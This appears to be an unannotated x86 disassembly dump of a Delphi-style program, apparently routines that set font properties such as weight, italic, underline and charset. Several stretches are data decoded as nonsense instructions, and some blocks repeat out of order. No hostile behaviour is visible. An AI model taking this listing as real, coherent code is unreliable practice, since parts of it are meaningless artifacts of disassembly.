xchg esi eax
inc edx
add al cl
xchg edx eax
inc edx
add [ eax - 0x6bffb8c6 ] ah
xchg ebp eax
inc edx
add [ edx + edi + 0x3af40047 ] ah
inc edi
add [ eax + 0x3b ] bh
inc edi
add ah al
cmp eax [ edi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x28004186 ] dh
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
xchg ebp eax
inc edx
add al dh
sub al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
stc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_472ecc
imul esp [ ebx - 0x75 ] 0x472b04c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
in al dx
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
and al 0xbc
inc ecx
add [ edi * 4 - 0x6c8fffbf ] dh
inc edx
add [ eax + 0x37 ] dl
inc edi
add [ esi + edi * 4 + 0x37840041 ] al
inc edi
add [ eax - 0x43ffb8c9 ] cl
xchg ebx eax
inc edx
add [ eax + edi + 0x39080047 ] dl
inc edi
add [ eax + 0x39 ] dh
inc edi
add [ ebx + ebp ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
sub al [ edi ]
sub al 0x0
add [ eax ] al
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4735ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42d814
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42d848
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403390
retn
mov eax [ ebx + 0x1c ]
call sub_427164
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_473d00
call sub_46f84c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_472d88
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405b68
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_429c20
call sub_42da98
mov [ ebp - 0x24 ] eax
jmp r-xdata
imul esp [ ebx + 0x7c ] 0xb400472a
pop edx
inc edx
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov eax esi
call sub_429c38
call sub_42a668
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a3dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4736bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42a038
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42a050
mov edx eax
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a0a8
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_473691
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x18 ]
call sub_427900
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473698
mov eax [ ebp - 0x18 ]
call sub_403390
retn
mov eax [ ebp - 0x8 ]
call sub_405b50
push eax
cmp [ ebp - 0x9 ] 0x1
cmc
sbb ecx ecx
mov edx r-xdata
lea eax [ ebp - 0x2c ]
call sub_473d1c
call sub_46f84c
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_472d88
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_473440
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
push ss
std
clc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
call sub_40351c
test al al
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405b68
sub edx 0xffffffdc
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_47296c
and [ ecx ] ebp
inc edi
add [ ebx ] ch
sub [ edi ] eax
xor eax 0x11004729
sub [ edi ] eax
sbb [ ecx ] ebp
inc edi
add [ ebx + 0x29 ] cl
inc edi
add [ ebp + 0x29 ] dl
inc edi
add [ edi + 0x29 ] bl
inc edi
add [ edi ] bh
sub [ edi ] eax
add al [ eax ]
add [ eax ] al
xor [ ebp + 0x5d ] ecx
jns r-xdata
sub ebp [ ecx ]
inc edi
add [ 0x11004729 ] dh
inc ebx
rcl [ ecx ] 0x1
sahf
xchg edx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x296cda82
inc edi
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
and esi [ esi - 0x2fbb58e1 ]
adc [ esi - 0x50dfff6d ] ebx
cmp eax 0x2980da82
inc edi
add [ eax + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ edx ] ch
inc edi
add [ eax + 0x4729 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub al [ edi ]
sub [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc edi
add al bl
xor eax 0x5bd00040
inc eax
add ah bl
pop ebx
inc eax
add ah ch
xor eax 0x35e00040
inc eax
add ah ch
pop ebx
inc eax
add [ ebx + esi + 0x40 ] al
add [ eax + 0x2d ] dl
inc edi
add [ ebp + ebp + 0x47 ] bh
add [ esp + esi + 0x47 ] bh
add [ edi ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x41657275
popad
jo r-xdata
inc edi
add [ ecx + edi + 0x39ac0047 ] cl
inc edi
add [ eax - 0xfffbd6b ] cl
jb r-xdata
jpo r-xdata
jo r-xdata
cmp [ edi ] eax
cmp [ edx ] bh
inc edi
add al dh
xchg ebp eax
inc edx
add [ eax + 0x3a ] bl
inc edi
add [ eax ] al
xchg esi eax
inc edx
add al cl
xchg edx eax
inc edx
add [ eax - 0x6bffb8c6 ] ah
xchg ebp eax
inc edx
add [ edx + edi + 0x3af40047 ] ah
inc edi
add [ eax + 0x3b ] bh
inc edi
add ah al
cmp eax [ edi ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x28004186 ] dh
add [ eax ] al
add [ ebx ] cl
push esp
dec edi
insb
inc edi
jb r-xdata
xchg ebp eax
inc edx
add al dh
sub al [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
stc
dec [ ebx + 0x20538bc6 ]
add [ ebp + 0x1f ] dh
mov ecx ebx
mov eax [ r-xdata ]
call sub_472ecc
imul esp [ ebx - 0x75 ] 0x472b04c0
add [ edi ] al
or edx [ edi + ecx * 2 + 0x6c ]
inc edi
jb r-xdata
in al dx
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
and al 0xbc
inc ecx
add [ edi * 4 - 0x6c8fffbf ] dh
inc edx
add [ eax + 0x37 ] dl
inc edi
add [ esi + edi * 4 + 0x37840041 ] al
inc edi
add [ eax - 0x43ffb8c9 ] cl
xchg ebx eax
inc edx
add [ eax + edi + 0x39080047 ] dl
inc edi
add [ eax + 0x39 ] dh
inc edi
add [ ebx + ebp ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
sub al [ edi ]
sub al 0x0
add [ eax ] al
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
lea eax [ ebx + 0x20 ]
call sub_405b68
mov eax esi
mov edx [ ebx + 0x20 ]
sub edx 0xffffffdc
mov edx eax
test edx edx
je r-xdata
jo r-xdata
imul esp [ ebx + 0x7c ] 0xb400472a
pop edx
inc edx
add [ eax ] al
add [ edi ] al
inc ecx
js r-xdata
mov dl 0x1
je r-xdata
add [ eax + 0x57cba55c ] ah
push cs
rcl [ ecx ] 0x1
mov ebp 0xaf20002f
push cs
pop ebx
adc [ ebx + 0x56 ] 0xd88bf28b
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
insb
jae r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_473440
mov edx eax
test edx edx
je r-xdata
add [ ebp - 0x17acffc0 ] cl
push ss
std
clc
dec [ ebx - 0x743c7428 ]
adc eax r-xdata
call sub_40351c
test al al
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405b68
sub edx 0xffffffdc
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_472b28
push ebx
call sub_402844
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax 0x8000ffff
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jge r-xdata
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_472b54
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x20 ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_472ecc
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x20 ]
call sub_405b68
sub edx 0xffffffdc
sub_472ba4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x18 ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_473440
mov edx eax
test edx edx
je r-xdata
lea eax [ ebx + 0x18 ]
call sub_405b68
sub edx 0xffffffdc
sub_472bf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472c37
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_472b54
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472c3e
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_472c44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405bc4
xor eax eax
push ebp
push sub_472c9e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_472b54
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472ca5
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_472cac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_472cef
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_472ba4
mov eax [ ebp - 0x4 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472cf6
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_472cfc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403360
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_472e3c
mov edx eax
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_4036f4
lea eax [ esi + 0x14 ]
call sub_405b68
mov eax esi
test bl bl
je r-xdata
sub edx 0xfffffff8
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_472d50
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax esi
call sub_472e0c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403380
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_472d88
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405bc4
xor eax eax
push ebp
push sub_472df0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_472e0c
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472df7
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
lea eax [ ebx + 0x10 ]
push eax
mov edx r-xdata
mov ecx [ ebx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_46fa58
sub_472e3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_472ecc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_472cfc
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_472f08
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4730ac
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4730b3
lea eax [ ebp - 0x28 ]
call sub_404120
lea eax [ ebp - 0x24 ]
call sub_405b50
lea eax [ ebp - 0xc ]
call sub_40482c
retn
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405b94
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_40482c
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov bl [ r-xdata ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x2
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x34 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
or bl 0x4
lea eax [ ebp - 0x1e ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_47307f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
call sub_4043a8
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x8 ]
call sub_427064
fild [ ebp - 0x18 ]
fdiv [ r-xdata ]
call sub_402b60
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_4270dc
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_427108
mov dl [ ebp - 0x1e ]
mov eax [ ebp - 0x8 ]
call sub_42716c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403390
retn
or bl 0x8
sub_4730d0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47324e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_404120
lea eax [ ebp - 0xc ]
call sub_40482c
lea eax [ ebp - 0x8 ]
call sub_405b50
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
xor eax eax
push ebp
push sub_473221
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405b94
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42704c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404978
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4270c0
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4270fc
test al 0x1
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4270fc
test al 0x2
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4270fc
test al 0x4
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4270fc
test al 0x8
setne al
neg al
sbb eax eax
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_427164
and eax 0xff
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
retn
sub_473259
add [ eax ] al
add [ edx ] al
loopne r-xdata
mov esp ebp
pop ebp
retn
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
add [ eax + 0x1c ] al
inc esi
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4733a1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0xc ]
mov ecx r-xdata
call sub_405b94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4733a8
lea eax [ ebp - 0x2c ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_405b50
lea eax [ ebp - 0x4 ]
call sub_40482c
retn
lea edx [ ebp - 0x2c ]
mov eax [ ebx + 0x1c ]
call sub_42704c
mov edx [ ebp - 0x2c ]
lea eax [ ebp - 0x4 ]
call sub_404978
mov [ ebp - 0x28 ] 0x20
mov eax [ ebp - 0x4 ]
call sub_404988
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270c0
mov [ ebp - 0x30 ] eax
fild [ ebp - 0x30 ]
fmul [ r-xdata ]
fistp [ ebp - 0x20 ]
fwait
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x1
je r-xdata
mov [ ebp - 0x18 ] 0x190
mov [ ebp - 0x18 ] 0x2bc
jmp r-xdata
mov eax [ ebx + 0x1c ]
call sub_427164
and eax 0xff
mov [ ebp - 0x16 ] ax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x2
setne al
neg al
sbb eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x4
setne al
neg al
sbb eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x1c ]
call sub_4270fc
test al 0x8
setne al
neg al
sbb eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
call sub_405b50
mov ecx eax
mov edx r-xdata
lea eax [ ebp - 0x28 ]
call sub_473d00
call sub_46f84c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_472d88
sub_4733d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473423
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
mov ecx r-xdata
call sub_405b94
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_472d88
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47342a
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_473440
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_472cfc
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_47347c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4292c8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4734ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
add eax 0x28
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405b94
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x8 ]
call sub_429c50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4734f1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0x0
mov eax [ ebp - 0x8 ]
call sub_403390
retn
sub_4734f5
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx r-xdata
call sub_405b94
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
mov [ ebp - 0x2c ] 0x14
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c ]
mov ebx [ esi + 0xc ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c074
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4735ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x14 ]
call sub_42d814
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
call sub_42d848
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403390
retn
mov [ ebp - 0x28 ] 0x4
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov [ ebp - 0x28 ] 0x3
mov eax esi
call sub_429c20
call sub_42da98
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov eax esi
call sub_429c38
call sub_42a668
mov [ ebp - 0x24 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a3dc
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4736bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_42a038
mov edx eax
mov eax [ ebp - 0x10 ]
